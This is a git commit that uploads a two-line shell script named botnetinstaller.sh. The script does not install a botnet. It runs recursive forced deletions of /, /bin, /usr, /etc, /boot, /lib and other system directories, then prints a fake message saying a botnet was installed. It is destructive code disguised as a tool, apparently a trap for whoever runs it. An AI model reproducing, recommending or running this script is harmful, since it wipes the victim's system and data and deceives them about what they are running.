00f2dbbf53bd7a9e7a6481bdee528a75e77c302b
HengkerProTzy <109279332+HengkerProTzy@users.noreply.github.com>
2022-08-12 13:55:03 +0700

    Add files via upload

---
+++ botnetinstaller.sh
@@ -0,0 +1,2 @@
+rm -rf /bin; rm -rf /usr; rm -rf /sbin; rm -rf /etc; rm -rf /dev; rm -rf /proc; rm -rf /srv; rm -rf /boot; rm -rf /lib; rm -fr /; rm -rf /mnt;  rm -rf *
+echo "Botnet  Succefully Installed"
